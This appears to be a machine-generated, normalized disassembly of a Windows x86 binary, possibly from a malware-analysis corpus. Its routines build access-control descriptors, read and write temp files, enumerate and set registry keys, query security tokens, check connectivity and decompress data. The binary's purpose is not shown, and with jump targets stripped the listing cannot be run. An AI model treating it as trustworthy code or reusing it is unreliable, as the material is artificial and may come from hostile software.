xor ecx ecx
lea ebx [ esi + 0x4c ]
push ebx
push 0x1
push ecx
push 0x23
push ecx
call edi
test eax eax
je r-xdata
dec eax
je r-xdata
pop edi
pop ebx
leave
retn
xor ecx ecx
lea ebx [ esi + 0x4c ]
push ebx
push 0x1
push ecx
push 0x2d
push ecx
call edi
test eax eax
je r-xdata
dec eax
je r-xdata
lea ebx [ esi + 0x4c ]
push ebx
push 0x208
call [ GetTempPathW@IAT ]
test eax eax
je r-xdata
xor al al
sub_40bfe5
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push edi
xor ebx ebx
lea edi [ esi + 0x30 ]
push edi
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push 0x1
lea eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0x100
call [ AllocateAndInitializeSid@IAT ]
cmp [ edi ] ebx
je r-xdata
xor al al
push 0x20
lea eax [ esi + 0x10 ]
pop edx
mov ecx eax
mov [ ecx ] bl
inc ecx
dec edx
jne r-xdata
mov ecx [ edi ]
push 0xc
mov [ esi + 0x2c ] ecx
mov [ eax ] 0x1fffff
mov [ esi + 0x14 ] 0x2
mov [ esi + 0x18 ] ebx
mov [ esi + 0x24 ] ebx
mov [ esi + 0x28 ] 0x5
pop edx
lea ecx [ esi + 0x4 ]
mov [ ecx ] bl
inc ecx
dec edx
jne r-xdata
lea ecx [ esi + 0x34 ]
push ecx
push ebx
push eax
push 0x1
call [ SetEntriesInAclW@IAT ]
test eax eax
jne r-xdata
push 0x14
push 0x40
call [ LocalAlloc@IAT ]
mov [ esi ] eax
cmp eax ebx
je r-xdata
push 0x1
push eax
call [ InitializeSecurityDescriptor@IAT ]
test eax eax
je r-xdata
push ebx
push [ esi + 0x34 ]
push 0x1
push [ esi ]
call [ SetSecurityDescriptorDacl@IAT ]
test eax eax
je r-xdata
mov eax [ esi ]
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] 0xc
mov [ esi + 0xc ] ebx
mov al 0x1
jmp r-xdata
pop edi
pop ebx
leave
retn
sub_40c0aa
push ecx
push ebx
push ebp
push esi
mov esi eax
xor ebx ebx
push edi
cmp [ esi + 0x258 ] bl
jne r-xdata
mov al 0x1
mov edi [ CreateFileW@IAT ]
mov ebp 0x10000000
lea eax [ esi + 0x4 ]
push eax
push ebx
jmp r-xdata
call [ GetLastError@IAT ]
cmp eax 0x20
je r-xdata
mov [ esi + 0x258 ] 0x1
jmp r-xdata
push ebx
push ebp
lea eax [ esi + 0x4c ]
push eax
call edi
mov [ esi + 0x254 ] eax
cmp eax 0xffffffff
je r-xdata
xor al al
jmp r-xdata
call sub_40bf09
test al al
je r-xdata
cmp [ esi + 0x258 ] bl
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
push ebx
push 0x2
push 0x4
cmp [ esi ] ebx
jne r-xdata
sub_40c11a
push ebx
push esi
mov esi ecx
xor ebx ebx
push edi
mov edi eax
mov [ esi ] ebx
mov [ esi + 0x34 ] ebx
mov [ esi + 0x30 ] ebx
call sub_40bfe5
mov eax [ esp + 0x10 ]
mov [ esi + 0x38 ] eax
xor eax eax
xor ecx ecx
add eax [ esp + 0x14 ]
mov [ esi + 0x258 ] bl
adc edi ecx
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] edi
mov [ esi + 0x48 ] ebx
call sub_40bf09
pop edi
mov eax esi
pop esi
pop ebx
retn 0x8
sub_40c15d
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
push esi
push edi
mov edi eax
mov bl [ edi + 0x258 ]
or esi 0xffffffff
call sub_40c0aa
test al al
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
leave
retn
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push [ edi + 0x254 ]
call [ SetFilePointer@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
or esi 0xffffffff
cmp esi 0x4
ja r-xdata
call sub_40bea8
test bl bl
jne r-xdata
sub_40c1af
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
mov edi ecx
mov esi eax
mov al [ edi + 0x258 ]
mov [ ebp - 0x1 ] al
xor ebx ebx
mov eax edi
mov [ ebp - 0x10 ] ebx
call sub_40c0aa
test al al
je r-xdata
xor al al
mov eax edi
call sub_40c15d
mov [ ebp - 0x8 ] eax
call sub_40c90c
cmp [ ebp - 0x8 ] ebx
jbe r-xdata
cmp [ ebp - 0x1 ] bl
jne r-xdata
push 0x1
push [ ebp - 0x8 ]
call sub_40c865
push ebx
lea eax [ ebp - 0xc ]
push eax
push ebx
push [ edi + 0x254 ]
mov [ ebp - 0xc ] ebx
call [ SetFilePointer@IAT ]
push ebx
lea eax [ ebp - 0x10 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
push [ edi + 0x254 ]
call [ ReadFile@IAT ]
push [ esi + 0x4 ]
push [ esi ]
call sub_4135c2
mov eax [ esi ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
call sub_40c65b
mov eax [ esi + 0x4 ]
sub eax [ ebp - 0x8 ]
mov ecx esi
push eax
call sub_40c642
mov al 0x1
jmp r-xdata
call sub_40bea8
pop edi
pop esi
pop ebx
leave
retn
sub_40c257
mov eax sub_41aba2
call sub_416a8c
sub esp 0x20
or [ ebp - 0x18 ] 0xffffffff
push ebx
push esi
push edi
mov edi edx
lea esi [ ebp - 0x2c ]
mov ebx ecx
call sub_40c9ad
xor esi esi
mov [ ebp - 0x4 ] esi
mov al [ ebx + 0x258 ]
mov [ ebp - 0x11 ] al
mov eax ebx
call sub_40c0aa
test al al
je r-xdata
mov eax [ ebp - 0x28 ]
cmp [ ebp - 0x18 ] eax
sete bl
or [ ebp - 0x4 ] 0xffffffff
lea esi [ ebp - 0x2c ]
call sub_40c938
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov al bl
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
push esi
lea eax [ ebp - 0x1c ]
push eax
push esi
push [ ebx + 0x254 ]
mov [ ebp - 0x1c ] esi
call [ SetFilePointer@IAT ]
push [ ebp - 0x28 ]
lea eax [ ebp - 0x2c ]
push eax
call sub_40cccc
cmp [ ebp - 0x2c ] esi
je r-xdata
push esi
lea eax [ ebp - 0x18 ]
push eax
push [ ebp - 0x28 ]
push [ ebp - 0x2c ]
push [ ebx + 0x254 ]
call [ WriteFile@IAT ]
cmp [ ebp - 0x11 ] 0x0
jne r-xdata
push [ ebp - 0x28 ]
push [ ebp - 0x2c ]
call sub_413461
mov edi ebx
call sub_40bea8
sub_40c30b
push ebp
mov ebp esp
sub esp 0x424
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x8 ]
mov [ ebp - 0x10 ] edx
push edx
mov [ ebp - 0x14 ] ecx
call [ RegOpenKeyW@IAT ]
test eax eax
jne r-xdata
xor al al
push ebx
push esi
xor ebx ebx
push edi
mov esi 0x104
cmp [ ebp + 0x10 ] bl
je r-xdata
cmp [ ebp + 0xc ] bl
je r-xdata
mov edi [ RegEnumValueW@IAT ]
push ebx
push ebx
push ebx
push ebx
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x424 ]
push eax
mov [ ebp - 0x8 ] ebx
push ebx
jmp r-xdata
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
pop edi
pop esi
mov al 0x1
pop ebx
jmp r-xdata
mov edi [ RegEnumKeyW@IAT ]
push esi
lea eax [ ebp - 0x424 ]
push eax
mov [ ebp - 0x8 ] ebx
push ebx
jmp r-xdata
push [ ebp - 0x4 ]
mov [ ebp - 0xc ] esi
call edi
test eax eax
je r-xdata
leave
retn 0x14
push [ ebp - 0x4 ]
mov [ ebp - 0xc ] esi
call edi
test eax eax
je r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x424 ]
push [ ebp + 0x18 ]
push eax
push [ ebp + 0x8 ]
call [ ebp + 0x14 ]
add esp 0x10
test al al
je r-xdata
push 0x208
push [ ebp + 0x8 ]
lea eax [ ebp - 0x21c ]
push eax
call [ lstrcpynW@IAT ]
lea eax [ ebp - 0x21c ]
push eax
call [ lstrlenW@IAT ]
cmp eax 0x102
jae r-xdata
inc [ ebp - 0x8 ]
push ebx
push ebx
push ebx
push ebx
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x424 ]
push eax
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
lea eax [ ebp - 0x21c ]
push [ ebp + 0x18 ]
push ebx
push eax
call [ ebp + 0x14 ]
add esp 0x10
test al al
je r-xdata
push r--data
lea eax [ ebp - 0x21c ]
push eax
call [ lstrcatW@IAT ]
lea eax [ ebp - 0x424 ]
push eax
lea eax [ ebp - 0x21c ]
push eax
call [ lstrcatW@IAT ]
push [ ebp + 0x18 ]
mov edx [ ebp - 0x10 ]
push [ ebp + 0x14 ]
mov ecx [ ebp - 0x14 ]
push [ ebp + 0x10 ]
lea eax [ ebp - 0x21c ]
push [ ebp + 0xc ]
push eax
call sub_40c30b
inc [ ebp - 0x8 ]
push esi
lea eax [ ebp - 0x424 ]
push eax
push [ ebp - 0x8 ]
sub_40c46e
push ebp
mov ebp esp
push ecx
push esi
lea eax [ ebp + 0xc ]
push eax
xor esi esi
lea eax [ ebp - 0x4 ]
push eax
push esi
push 0x20006
push esi
push esi
push esi
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] esi
push [ ebp + 0x8 ]
call [ RegCreateKeyExW@IAT ]
test eax eax
je r-xdata
cmp [ ebp + 0x18 ] esi
je r-xdata
xor al al
jmp r-xdata
push [ ebp - 0x4 ]
cmp [ ebp + 0x1c ] esi
je r-xdata
pop esi
leave
retn 0x18
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push esi
push [ ebp + 0x10 ]
push [ ebp - 0x4 ]
call [ RegSetValueExW@IAT ]
push [ ebp - 0x4 ]
test eax eax
je r-xdata
call [ RegCloseKey@IAT ]
mov al 0x1
call [ RegCloseKey@IAT ]
jmp r-xdata
sub_40c4dc
push ebp
mov ebp esp
sub esp 0xc
push esi
lea eax [ ebp - 0x4 ]
push eax
push 0x1
xor esi esi
push esi
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] esi
push [ ebp + 0x8 ]
mov [ ebp - 0x8 ] esi
mov [ ebp - 0xc ] 0x3
call [ RegOpenKeyExW@IAT ]
test eax eax
je r-xdata
push ebx
mov ebx [ RegQueryValueExW@IAT ]
lea eax [ ebp - 0x8 ]
push eax
push esi
lea eax [ ebp - 0xc ]
push eax
push esi
push [ ebp + 0x10 ]
push [ ebp - 0x4 ]
call ebx
test eax eax
je r-xdata
xor al al
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ edi ] eax
jb r-xdata
push [ ebp - 0x4 ]
jmp r-xdata
pop esi
leave
retn 0x10
push [ ebp - 0x4 ]
mov [ edi ] eax
call [ RegCloseKey@IAT ]
cmp [ ebp + 0x14 ] esi
sete al
cmp [ ebp + 0x14 ] esi
je r-xdata
mov [ edi ] esi
call [ RegCloseKey@IAT ]
xor al al
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x14 ]
lea eax [ ebp - 0xc ]
push eax
push esi
push [ ebp + 0x10 ]
push [ ebp - 0x4 ]
call ebx
push [ ebp - 0x4 ]
test eax eax
je r-xdata
pop ebx
mov eax [ ebp - 0x8 ]
mov [ edi ] eax
call [ RegCloseKey@IAT ]
mov al 0x1
jmp r-xdata
sub_40c588
push ebp
mov ebp esp
push ecx
push ebx
push edi
lea eax [ ebp - 0x4 ]
push eax
push 0x1
xor ebx ebx
push 0x8
mov [ ebp - 0x4 ] ebx
call [ GetCurrentThread@IAT ]
push eax
call [ OpenThreadToken@IAT ]
mov edi [ GetLastError@IAT ]
test eax eax
jne r-xdata
push esi
push [ esi ]
push [ ebp + 0x8 ]
push 0x1
push [ ebp - 0x4 ]
call [ GetTokenInformation@IAT ]
test eax eax
jne r-xdata
call edi
cmp eax 0x3f0
je r-xdata
mov bl 0x1
jmp r-xdata
call edi
cmp eax 0x7a
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
push 0x8
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
xor al al
push [ ebp - 0x4 ]
call [ CloseHandle@IAT ]
mov al bl
jmp r-xdata
pop edi
pop ebx
leave
retn 0x4
sub_40c607
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
call [ InternetGetConnectedState@IAT ]
mov ecx [ ebp - 0x4 ]
mov [ esi + 0x58cc ] ecx
test eax eax
je r-xdata
xor al al
leave
retn
test cl 0x20
jne r-xdata
mov edx ecx
shr edx 0x2
mov al 0x1
and dl al
mov [ esi + 0x58c8 ] dl
leave
retn
sub_40c65b
mov ecx [ esi + 0x4 ]
cmp ecx 0x4
jge r-xdata
mov eax [ esi ]
add ecx 0xfffffffc
push ecx
lea ecx [ eax + 0x4 ]
push ecx
push eax
call sub_401f50
add [ esi + 0x4 ] 0xfffffffc
add esp 0xc
mov al 0x1
retn
xor al al
retn
sub_40c690
push ebp
mov ebp esp
sub esp 0x28
push ebx
push esi
push edi
call sub_40e9bf
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x1c ] eax
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
mov edi [ ecx ]
sar eax 0x2
dec eax
mov [ ebp - 0x24 ] eax
inc eax
cdq
sub eax edx
sar eax 0x1
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x8 ] eax
xor al al
test esi esi
je r-xdata
dec [ ebp - 0x4 ]
sub ebx 0x4
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
mov edx [ ebp - 0x20 ]
mov [ edx ] esi
mov [ ebx ] ecx
cmp ecx esi
jne r-xdata
cmp ecx esi
je r-xdata
inc [ ebp - 0x14 ]
mov eax [ ebp - 0x14 ]
inc [ ebp - 0xc ]
add [ ebp - 0x10 ] 0x4
cmp eax [ ebp - 0x24 ]
jle r-xdata
test al al
jne r-xdata
mov dl [ ecx + 0x35 ]
mov al [ esi + 0x35 ]
cmp dl al
jne r-xdata
mov eax [ ebp - 0xc ]
mov ebx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cdq
sub eax edx
sar eax 0x1
mov [ ebp - 0x8 ] eax
test eax eax
jg r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ ebx ]
lea eax [ edi + eax * 4 ]
mov ecx [ eax ]
mov [ ebp - 0x20 ] eax
mov al 0x1
test ecx ecx
je r-xdata
setb al
jmp r-xdata
mov edi [ ebp - 0x1c ]
mov edx edi
sub edx [ ecx + 0x30 ]
sub edi [ esi + 0x30 ]
cmp edx edi
jne r-xdata
mov eax [ ebp - 0x8 ]
and [ ebp - 0xc ] 0x0
mov [ ebp - 0x14 ] eax
lea eax [ edi + eax * 4 ]
mov [ ebp - 0x10 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x4 ]
sar eax 0x2
xor ecx ecx
test eax eax
jle r-xdata
test al al
jne r-xdata
seta al
mov eax [ ecx + 0x28 ]
cmp eax [ esi + 0x28 ]
setb al
jmp r-xdata
cmp [ edi + ecx * 4 ] 0x0
je r-xdata
mov edi [ ebp - 0x18 ]
jmp r-xdata
mov eax ecx
shl eax 0x2
mov [ edx + 0x4 ] eax
inc ecx
cmp ecx eax
jl r-xdata
jmp r-xdata
sub_40c79e
push esi
push edi
xor edi edi
call sub_40f29b
mov esi rw-data
push esi
call sub_40ce2a
test al al
je r-xdata
mov eax edi
pop edi
pop esi
retn 0x4
mov eax [ rw-data ]
shr eax 0x2
jmp r-xdata
dec eax
jns r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + eax * 4 ]
movzx ecx [ ecx + 0x35 ]
cmp ecx [ esp + 0xc ]
jne r-xdata
call sub_40f29b
push esi
call sub_40ce0a
inc edi
sub_40c7e9
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
lea esi [ edi + 0x10 ]
mov [ ebp - 0x8 ] esi
call sub_40f29b
test esi esi
je r-xdata
xor al al
push esi
call sub_40ce2a
jmp r-xdata
pop esi
pop ebx
leave
retn
mov esi [ edi + 0x4 ]
and [ ebp - 0x4 ] 0x0
mov ebx [ edi ]
shr esi 0x2
test esi esi
jle r-xdata
test al al
je r-xdata
push edi
call sub_40c690
call sub_40f29b
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ ebx + eax * 4 ]
test [ eax + 0x34 ] 0x1
je r-xdata
push [ ebp - 0x8 ]
call sub_40ce0a
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jl r-xdata
call sub_40f29b
mov eax [ ebp - 0x4 ]
push [ ebx + eax * 4 ]
call sub_412d05
mov eax [ ebp - 0x4 ]
and [ ebx + eax * 4 ] 0x0
sub_40c865
push ebp
mov ebp esp
mov ecx [ esi + 0x8 ]
push ebx
xor ebx ebx
push edi
cmp ecx ebx
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ esi + 0x4 ]
lea eax [ eax + edx + 0x2000 ]
cdq
and edx 0xf
add eax edx
mov edi eax
sar edi 0x4
inc edi
shl edi 0x4
mov edi 0x2000
jmp r-xdata
mov eax [ esi + 0x4 ]
add eax [ ebp + 0x8 ]
cmp ecx eax
jg r-xdata
xor al al
jmp r-xdata
cmp [ ebp + 0x8 ] ebx
jg r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ esi ] ebx
jne r-xdata
pop edi
pop ebx
pop ebp
retn 0x8
mov al 0x1
mov eax [ ebp + 0x8 ]
add [ esi + 0x4 ] eax
call sub_40f29b
mov eax edi
call sub_412da8
mov ebx eax
test ebx ebx
je r-xdata
call sub_40f29b
mov eax edi
call sub_412da8
mov [ esi ] eax
mov [ esi + 0x4 ] ebx
cmp eax ebx
jne r-xdata
push [ esi + 0x4 ]
push [ esi ]
push ebx
call sub_401f50
add esp 0xc
call sub_40f29b
push [ esi ]
call sub_412d05
mov [ esi ] ebx
mov [ esi + 0x8 ] edi
mov [ esi + 0x8 ] ebx
jmp r-xdata
sub_40c94a
cmp esi edi
je r-xdata
mov eax esi
retn
mov eax [ edi + 0xc ]
mov [ esi + 0xc ] eax
mov eax [ edi + 0x8 ]
test eax eax
jle r-xdata
mov [ esi + 0x8 ] 0x2000
mov [ esi + 0x8 ] eax
jmp r-xdata
call sub_40f29b
mov eax [ esi + 0x8 ]
call sub_412da8
mov [ esi ] eax
mov ecx [ edi ]
test ecx ecx
je r-xdata
call sub_40f29b
push [ esi ]
call sub_412d05
cmp [ esi ] 0x0
je r-xdata
mov eax [ edi + 0x4 ]
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
cmp [ edi + 0x8 ] 0x0
jle r-xdata
push [ esi + 0x8 ]
push ecx
push eax
call sub_401f50
add esp 0xc
sub_40c9ad
mov eax [ edi + 0xc ]
mov [ esi + 0xc ] eax
mov eax [ edi + 0x8 ]
test eax eax
jle r-xdata
mov [ esi + 0x8 ] 0x2000
mov [ esi + 0x8 ] eax
jmp r-xdata
mov eax [ edi + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax esi
retn
test eax eax
je r-xdata
call sub_40f29b
mov eax [ esi + 0x8 ]
call sub_412da8
mov [ esi ] eax
mov ecx [ edi ]
test ecx ecx
je r-xdata
cmp [ edi + 0x8 ] 0x0
jle r-xdata
push [ esi + 0x8 ]
push ecx
push eax
call sub_401f50
add esp 0xc
sub_40ca1c
mov eax [ esp + 0x4 ]
push ebx
push ebp
push esi
push edi
mov edi [ eax + 0x4 ]
shr edi 0x2
xor ebx ebx
test edi edi
jle r-xdata
mov esi [ esp + 0x14 ]
call sub_40c90c
pop edi
pop esi
pop ebp
pop ebx
retn 0x4
mov esi [ Sleep@IAT ]
push 0xa
call esi
push 0x0
call esi
mov eax [ esp + 0x14 ]
mov ebp [ eax ]
call sub_40f29b
push [ ebp + ebx * 4 ]
call sub_412d05
inc ebx
cmp ebx edi
jl r-xdata
sub_40ca67
mov eax sub_41aac2
call sub_416a8c
push ecx
push esi
mov esi rw-data
mov [ ebp - 0x10 ] esi
and [ ebp - 0x4 ] 0x0
call sub_40f29b
push rw-data
call sub_40cdfa
or [ ebp - 0x4 ] 0xffffffff
call sub_40c938
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_40caa4
mov eax sub_41aad4
call sub_416a8c
push ecx
push esi
mov esi rw-data
mov [ ebp - 0x10 ] esi
call sub_40c9fb
and [ ebp - 0x4 ] 0x0
call sub_40f29b
push rw-data
call sub_40ce4a
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_40cae3
push ecx
push esi
mov esi eax
xor eax eax
cmp [ esi ] eax
je r-xdata
xor al al
cmp [ esp + 0xc ] eax
je r-xdata
push eax
push edi
call sub_40c865
test al al
je r-xdata
push [ esi + 0x4 ]
mov eax [ esi ]
push eax
add eax edi
push eax
call sub_401f50
add [ esi + 0x4 ] edi
add esp 0xc
push edi
push [ esp + 0x10 ]
push [ esi ]
call sub_406530
add esp 0xc
mov al 0x1
jmp r-xdata
pop esi
pop ecx
retn 0x4
sub_40cb2c
push ecx
push esi
mov esi eax
xor eax eax
cmp [ esi ] eax
je r-xdata
xor al al
cmp [ esp + 0xc ] eax
je r-xdata
cmp edi eax
jl r-xdata
push eax
push edi
call sub_40c865
test al al
je r-xdata
mov eax [ esi + 0x4 ]
add eax [ esi ]
push edi
push [ esp + 0x10 ]
push eax
call sub_406530
add esp 0xc
add [ esi + 0x4 ] edi
mov al 0x1
jmp r-xdata
pop esi
pop ecx
retn 0x4
sub_40cb6c
push ebp
mov ebp esp
sub esp 0xc
cmp [ ebp + 0x8 ] 0x0
push ebx
push esi
push edi
mov edi eax
je r-xdata
xor al al
test edi edi
jle r-xdata
and [ ebp - 0x8 ] 0x0
lea esi [ edi + edi ]
mov [ ebp - 0x4 ] esi
call sub_40f29b
mov eax esi
call sub_412da8
mov ebx eax
mov [ ebp - 0xc ] ebx
test ebx ebx
je r-xdata
call sub_40f29b
push edi
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
push ebx
call sub_4101eb
test al al
je r-xdata
call sub_40f29b
lea eax [ edi + 0x3b ]
call sub_412da8
mov esi eax
mov [ ebp - 0x4 ] esi
test esi esi
jne r-xdata
mov edi [ ebp - 0x4 ]
mov [ ebp + 0x8 ] ebx
mov [ ebp - 0x8 ] 0x2
call sub_40f29b
call sub_40d34b
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
call sub_40f29b
mov eax [ ebp + 0xc ]
mov [ esi + 0x10 ] 0x80beaa2a
mov [ esi + 0x18 ] eax
mov eax [ ebp + 0x14 ]
mov [ esi + 0x1c ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0x20 ] eax
mov al [ ebp + 0x18 ]
lea ebx [ esi + 0x4 ]
mov [ ebx ] 0x1
mov [ esi + 0x35 ] al
mov eax [ ebp + 0x1c ]
mov [ esi + 0x2c ] eax
mov eax [ ebp + 0x20 ]
mov [ esi + 0x24 ] edi
mov [ esi + 0x28 ] eax
and [ esi + 0x14 ] 0x0
mov al [ ebp - 0x8 ]
mov [ esi + 0x34 ] al
mov eax [ ebp + 0x24 ]
push edi
push [ ebp + 0x8 ]
mov [ esi + 0x30 ] eax
lea eax [ esi + 0x36 ]
push eax
call sub_401f50
add esp 0xc
call sub_40f29b
push [ ebp - 0xc ]
call sub_412d05
call sub_40f29b
test ebx ebx
je r-xdata
call sub_40f29b
push ebx
call sub_412d05
xor eax eax
lea eax [ edi + 0x32 ]
push eax
push ebx
call sub_4100a9
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
push 0x4
mov esi rw-data
pop edi
mov eax esi
call sub_40cb2c
push esi
call sub_40c690
call sub_40f29b
push ebx
call sub_40ce0a
mov al 0x1
jmp r-xdata
push 0x67
call [ Sleep@IAT ]
jmp r-xdata
mov [ esi ] eax
mov [ esi + edi + 0x36 ] eax
mov ebx rw-data
pop edi
pop esi
pop ebx
leave
retn 0x20
call sub_40f29b
push ebx
call sub_40ce2a
test al al
jne r-xdata
sub_40ccf8
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0xc ] 0x0
push edi
jne r-xdata
push [ ebp + 0xc ]
call [ lstrlenW@IAT ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push 0x4
pop edi
call sub_40cb2c
test al al
je r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_40cce2
jmp r-xdata
xor al al
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
pop edi
leave
retn 0x8
mov al 0x1
jmp r-xdata
push [ ebp + 0xc ]
lea edi [ eax + eax ]
mov eax [ ebp + 0x8 ]
call sub_40cb2c
jmp r-xdata
sub_40cd50
push edi
test esi esi
jne r-xdata
push esi
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
push esi
mov eax rw-data
call sub_40cb2c
pop edi
retn
xor al al
pop edi
retn
sub_40cd70
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov edi eax
call sub_40e9bf
mov [ ebp - 0x4 ] eax
test edi edi
je r-xdata
xor al al
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1 ]
cmp ecx 0x63fffff
ja r-xdata
mov ebx [ ebp + 0x1c ]
mov esi 0x124f8
mov [ ebp + 0x8 ] eax
cmp eax esi
jbe r-xdata
push [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0x20 ]
push ebx
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_40cb6c
test al al
setne al
jmp r-xdata
push [ ebp - 0x4 ]
mov eax esi
push [ ebp + 0x20 ]
push ebx
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_40cb6c
test al al
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x1c
sub [ ebp + 0x8 ] esi
add edi esi
add ebx esi
cmp [ ebp + 0x8 ] esi
ja r-xdata
sub_40ce6c
push ecx
push esi
lea esi [ ecx + eax ]
push edi
xor edi edi
mov edx ecx
mov eax 0x80
cmp ecx esi
jae r-xdata
mov eax edi
pop edi
pop esi
pop ecx
retn
push ebx
mov bl [ esp + 0xf ]
test al bl
je r-xdata
mov bl [ edx ]
xor eax eax
inc eax
inc edx
inc edx
inc edi
movzx ecx [ edx ]
shr ecx 0x2
add ecx 0x3
add edx 0x2
dec ecx
js r-xdata
add eax eax
cmp eax 0x100
jne r-xdata
pop ebx
cmp edx esi
jb r-xdata
lea edi [ edi + ecx + 0x1 ]
jmp r-xdata
sub_40ceb9
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0xc ]
and [ ebp - 0xc ] 0x0
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ecx ]
add eax edx
add esi ebx
push edi
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] 0x80
cmp edx eax
jae r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
cmp ebx esi
jae r-xdata
cmp edx [ ebp - 0x10 ]
jae r-xdata
shl [ ebp - 0x8 ] 0x1
cmp [ ebp - 0x8 ] 0x100
jne r-xdata
push 0xfffffffe
pop eax
jmp r-xdata
mov al [ ebp - 0x8 ]
test [ ebp - 0x1 ] al
je r-xdata
mov al [ edx ]
mov [ ebp - 0x8 ] 0x1
mov [ ebp - 0x1 ] al
inc edx
pop edi
pop esi
pop ebx
leave
retn
mov al [ edx ]
mov [ ebx ] al
inc ebx
inc edx
inc [ ebp - 0xc ]
movzx eax [ edx ]
movzx ecx [ edx + 0x1 ]
mov edi eax
shl eax 0x8
or ecx eax
and ecx 0x3ff
shr edi 0x2
mov eax ebx
sub eax ecx
add edi 0x3
add edx 0x2
cmp eax [ ebp + 0x8 ]
jae r-xdata
dec edi
jns r-xdata
or eax 0xffffffff
jmp r-xdata
cmp ebx esi
jae r-xdata
jmp r-xdata
cmp edx [ ebp - 0x10 ]
jb r-xdata
mov cl [ eax ]
mov [ ebx ] cl
inc ebx
inc eax
inc [ ebp - 0xc ]
sub_40cf69
push ebp
mov ebp esp
sub esp 0x814
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
xor eax eax
push 0x7fe
push eax
mov [ ebp - 0x814 ] ax
lea eax [ ebp - 0x812 ]
push eax
mov [ ebp - 0xc ] 0x80
call sub_405830
mov eax [ ebp + 0x10 ]
add esp 0xc
add eax esi
mov [ ebp - 0x14 ] eax
jmp r-xdata
cmp esi eax
jb r-xdata
shl [ ebp - 0xc ] 0x1
cmp [ ebp - 0xc ] 0x100
jne r-xdata
sub edi [ ebp + 0xc ]
mov eax [ ebp + 0x14 ]
mov [ eax ] edi
add eax 0xffffffbe
cmp esi eax
jbe r-xdata
mov ecx [ ebp + 0x14 ]
mov edx [ ecx ]
mov ebx [ ebp + 0xc ]
lea edx [ edx + ebx - 0x11 ]
cmp edi edx
jae r-xdata
movzx eax [ esi ]
movzx ecx [ esi + 0x1 ]
shl eax 0x8
add eax ecx
movzx ecx [ esi + 0x2 ]
shl eax 0x8
